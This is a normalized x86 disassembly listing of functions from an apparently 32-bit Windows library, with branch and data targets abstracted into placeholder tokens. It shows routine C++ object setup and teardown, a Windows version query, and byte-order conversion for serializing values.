push sub_1004e562
mov eax [ fs : 0x0 ]
push eax
sub esp 0x130
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x138 ] 0x0
mov [ ebp - 0x13c ] edi
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x124 ]
push 0x114
push 0x0
push eax
mov [ ebp - 0x138 ] 0x1
call sub_10045ec0
add esp 0xc
mov [ ebp - 0x124 ] 0x114
lea eax [ ebp - 0x124 ]
push eax
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x4
push [ ebp - 0x114 ]
mov esi [ htonl@IAT ]
call esi
push [ ebp - 0x120 ]
mov [ ebp - 0x134 ] eax
call esi
push [ ebp - 0x11c ]
mov [ ebp - 0x130 ] eax
call esi
push [ ebp - 0x118 ]
mov [ ebp - 0x128 ] eax
call esi
mov [ ebp - 0x12c ] eax
mov ecx edi
push 0x4
lea eax [ ebp - 0x134 ]
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0x130 ]
mov ecx edi
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0x128 ]
mov ecx edi
push eax
call sub_10005470
push 0x4
lea eax [ ebp - 0x12c ]
mov ecx edi
push eax
call sub_10005470
sub_10018bc0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp esi [ ebp + 0x8 ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov ecx esi
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_10005010
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10018c90
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e605
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx ecx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] 0x0
mov [ edx ] r--data
mov [ edx + 0x90 ] r--data
mov [ edx + 0x84 ] r--data
mov [ ebp - 0x4 ] 0x0
lea ecx [ edx + 0x8c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ edx ]
mov [ ebp - 0x10 ] 0x3
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x4 ] eax
mov [ edx + 0x4 ] 0xd
mov [ ebp - 0x4 ] 0x4
mov eax [ edx ]
mov eax [ eax + 0x4 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov eax [ eax + 0x8 ]
mov [ edx + eax ] r--data
mov eax [ edx ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x84 ]
mov [ ecx + edx - 0x4 ] eax
mov eax [ edx ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x8c ]
mov [ ecx + edx - 0x4 ] eax
mov [ edx + 0x30 ] 0xf
mov [ edx + 0x2c ] 0x0
mov [ edx + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x5
mov [ edx + 0x48 ] 0xf
mov [ edx + 0x44 ] 0x0
mov [ edx + 0x34 ] 0x0
mov [ ebp - 0x4 ] 0x6
mov [ edx + 0x60 ] 0xf
mov [ edx + 0x5c ] 0x0
mov [ edx + 0x4c ] 0x0
mov [ ebp - 0x4 ] 0x7
mov [ edx + 0x78 ] 0xf
mov [ edx + 0x74 ] 0x0
mov [ edx + 0x64 ] 0x0
mov [ ebp - 0x4 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0xc ] eax
mov [ edx + 0x18 ] 0x0
mov [ edx + 0x14 ] 0x0
mov [ edx + 0x10 ] 0x1
mov [ ebp - 0x4 ] 0xffffffff
mov eax edx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0xc
sub_10018e00
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x84 ]
lea ecx [ edi + 0x84 ]
call sub_10018e60
test [ ebp + 0x8 ] 0x1
mov ecx [ edi + 0x90 ]
mov [ edi + 0x8c ] r--data
mov ecx [ ecx + 0x4 ]
mov [ ecx + edi + 0x90 ] r--data
mov [ edi + 0x84 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_10018e60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e657
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x84 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x84 ] r--data
mov eax [ esi - 0x84 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x84 ] r--data
mov eax [ esi - 0x84 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x84 ]
mov [ ecx + esi - 0x88 ] eax
mov eax [ esi - 0x84 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x8c ]
mov [ ecx + esi - 0x88 ] eax
mov [ ebp - 0x4 ] 0x4
mov ecx [ esi - 0x6c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x3
cmp [ esi - 0xc ] 0x10
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi - 0xc ] 0xf
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x2
cmp [ esi - 0x24 ] 0x10
jb r-xdata
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x24 ] 0xf
mov [ esi - 0x28 ] 0x0
mov [ esi - 0x38 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ esi - 0x3c ] 0x10
jb r-xdata
push [ esi - 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x3c ] 0xf
mov [ esi - 0x40 ] 0x0
mov [ esi - 0x50 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ esi - 0x54 ] 0x10
jb r-xdata
push [ esi - 0x50 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x54 ] 0xf
mov [ esi - 0x58 ] 0x0
mov [ esi - 0x68 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi - 0x84 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x84 ] r--data
mov eax [ esi - 0x84 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + esi - 0x88 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x68 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10018fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e698
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
sub esp 0x18
mov ecx esp
mov [ ebp - 0x28 ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x8 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x24 ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x1c ]
lea eax [ ebp - 0x24 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp - 0x10 ] 0xf
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push [ ebp - 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100190c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e698
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
sub esp 0x18
mov ecx esp
mov [ ebp - 0x28 ] esp
xor eax eax
push 0xffffffff
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ ebp + 0x8 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x24 ]
call sub_1003c1b0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x64 ]
lea eax [ ebp - 0x24 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp - 0x10 ] 0xf
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
push [ ebp - 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x1c ] 0x7
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100191e0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10019210
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e6c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_100192b0
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call [ htons@IAT ]
movzx eax ax
mov ecx esi
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push 0x2
push eax
call sub_100194e0
pop esi
pop ebp
retn 0x4
sub_100192e0
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call [ htonl@IAT ]
mov [ ebp + 0x8 ] eax
mov ecx esi
push 0x4
lea eax [ ebp + 0x8 ]
push eax
call sub_100194e0
pop esi
pop ebp
retn 0x4
sub_10019310
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
call sub_1002c060
add esp 0x8
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
mov ecx esi
push 0x8
push eax
call sub_100194e0
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10019350
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e6f8
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
push [ ebp + 0x18 ]
call [ eax + 0x10 ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] 0x10
lea edx [ ebp + 0x8 ]
mov esi [ ebp + 0x18 ]
mov ecx edi
cmovae edx [ ebp + 0x8 ]
mov eax [ edi ]
push esi
push edx
call [ eax + 0x4 ]
cmp esi eax
jne r-xdata
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
sub_100193f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e730
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x1
sub esp 0x18
mov eax esp
mov [ esp + 0x28 ] esp
mov [ eax + 0x14 ] 0xf
mov [ eax + 0x10 ] 0x0
mov [ eax ] 0x0
mov [ esp + 0x54 ] 0x0
lea edx [ esp + 0x2c ]
mov ecx [ esi + 0x8 ]
push edx
mov eax [ ecx ]
mov [ esp + 0x58 ] 0xffffffff
call [ eax + 0xc ]
mov [ esp + 0x38 ] 0x1
lea edx [ esp + 0x10 ]
cmp [ esp + 0x24 ] 0x10
mov ecx [ esi + 0xc ]
push [ esp + 0x20 ]
cmovae edx [ esp + 0x14 ]
push edx
mov eax [ ecx ]
push [ esi + 0x4 ]
call [ eax + 0x10 ]
mov ecx [ esi + 0xc ]
add [ esi + 0x4 ] eax
mov eax [ ecx ]
call [ eax + 0xc ]
mov [ esp + 0x38 ] 0xffffffff
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov [ esp + 0x24 ] 0xf
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ esp + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100194e0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004e770
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
sub esp 0x18
mov ecx esp
mov [ esp + 0x28 ] esp
push esi
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100019e0
mov [ esp + 0x54 ] 0x0
lea edx [ esp + 0x2c ]
mov ecx [ edi + 0x8 ]
push edx
mov eax [ ecx ]
mov [ esp + 0x58 ] 0xffffffff
call [ eax + 0xc ]
mov [ esp + 0x38 ] 0x1
lea edx [ esp + 0x10 ]
cmp [ esp + 0x24 ] 0x10
mov ecx [ edi + 0xc ]
push [ esp + 0x20 ]
cmovae edx [ esp + 0x14 ]
push edx
mov eax [ ecx ]
push [ edi + 0x4 ]
call [ eax + 0x10 ]
add [ edi + 0x4 ] eax
add [ edi + 0x10 ] esi
mov [ esp + 0x38 ] 0xffffffff
cmp [ esp + 0x24 ] 0x10
jb r-xdata
mov [ esp + 0x24 ] 0xf
mov eax 0x1
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x10 ] 0x0
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x1c ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x8
push [ esp + 0x10 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_100195e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e6c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10019660
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10019690
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_10019690
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e7ce
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
mov [ ebp - 0x4 ] 0x2
lea ebx [ ecx + 0x20 ]
mov edi [ ebx ]
mov esi [ edi ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x3
mov eax [ ebx ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ ebx ]
mov [ eax + 0x4 ] eax
mov [ ebx + 0x4 ] 0x0
cmp ecx [ ebx ]
je r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x1
push [ ebx ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp - 0x10 ]
cmp [ ebx + 0x18 ] 0x10
jb r-xdata
mov esi [ ecx ]
push ecx
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
cmp esi [ ebx ]
jne r-xdata
mov esi [ esi ]
cmp esi edi
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ ebx + 0x18 ] 0xf
mov [ ebx + 0x14 ] 0x0
mov [ ebx + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebx ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebx + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10019770
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e7f8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor esi esi
cmp [ edi + 0x1c ] 0x70
jne r-xdata
cmp [ edi + 0x1c ] 0x71
jne r-xdata
call sub_10007010
mov esi eax
sub esp 0x18
lea eax [ edi + 0x4 ]
mov ecx esp
mov [ ebp - 0x10 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call [ eax + 0x8 ]
test eax eax
jne r-xdata
call sub_100070d0
mov esi eax
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx esi
push 0x1
call [ eax ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10019820
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e866
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov [ ebp - 0x14 ] eax
mov edi [ eax + 0x20 ]
mov esi [ edi ]
cmp esi edi
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
lea esp [ esp ]
mov ecx [ esi + 0x8 ]
push ebx
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp eax 0x20000
jbe r-xdata
mov esi [ esi ]
cmp esi edi
jne r-xdata
push 0x18
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0x3
test edi edi
je r-xdata
push 0x2c
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
push ebx
mov eax [ ecx ]
call [ eax + 0x4 ]
test eax eax
jne r-xdata
xor edi edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x4
push 0x0
mov [ edi ] r--data
mov [ edi + 0x4 ] 0x0
mov [ edi + 0x8 ] 0x0
call sub_1003cdeb
push [ edi + 0x4 ]
mov [ edi + 0xc ] eax
push 0x0
push eax
call sub_10045ec0
add esp 0x10
mov [ edi + 0x10 ] 0x0
mov [ edi + 0x14 ] 0x0
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
xor edi edi
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
sub esp 0x18
mov edi esp
mov [ ebp - 0x18 ] esp
sub esp 0x18
mov ecx esp
mov [ ebp - 0x1c ] esp
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push r--data
mov [ ecx ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
mov ecx edi
call sub_1003c0f0
add esp 0x18
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x10 ]
call sub_1002b560
mov edi eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebx ]
mov ecx ebx
mov eax [ eax + 0x4 ]
call eax
push 0x1
mov [ ebp + 0xb ] al
lea ecx [ ebp + 0xb ]
mov eax [ edi ]
push ecx
push 0x0
mov ecx edi
call [ eax + 0x10 ]
mov ecx [ ebp - 0x14 ]
call sub_10019770
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi + 0x14 ] 0x1
mov eax [ edi ]
mov ecx edi
call [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x30 ] r--data
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x30 ] r--data
mov [ ebp - 0x2c ] 0x1
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x6
lea edx [ ebp - 0x30 ]
mov ecx [ esi + 0x8 ]
push edx
push ebx
mov eax [ ecx ]
call [ eax + 0xc ]
lea ecx [ ebp - 0x30 ]
mov esi eax
call sub_100193f0
test esi esi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x30 ] r--data
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebp - 0x28 ]
test ecx ecx
je r-xdata
mov eax [ edi ]
mov ecx edi
push 0x1
call [ eax ]
xor edi edi
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov [ ebp - 0x30 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
push 0x1
call [ edx ]
sub_10019a70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c028
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x4 ]
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov al [ ebp + 0x20 ]
mov [ esi + 0x1c ] al
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_10019b00
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e8a0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov edx [ eax ]
mov [ eax ] eax
mov eax [ edi ]
mov [ eax + 0x4 ] eax
mov [ edi + 0x4 ] 0x0
cmp edx [ edi ]
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push [ edi ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov esi [ edx ]
push edx
call j_sub_1003f3e3#2
add esp 0x4
mov edx esi
cmp esi [ edi ]
jne r-xdata
sub_10019b80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e8e2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push 0xc
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
call sub_1003c58d
mov edx [ ebp + 0xc ]
mov ecx eax
mov edx eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ecx ] edx
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x1
mov [ eax ] ecx
mov [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x4 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x2
test ecx ecx
je r-xdata
sub_10019c30
push ebp
mov ebp esp
push 0xffffffff
push sub_1004e911
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019b80
mov edx eax
mov [ ebp + 0xc ] edx
mov [ ebp - 0x4 ] 0x0
lea ecx [ edx + 0x8 ]
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0x1
test ecx ecx
je r-xdata
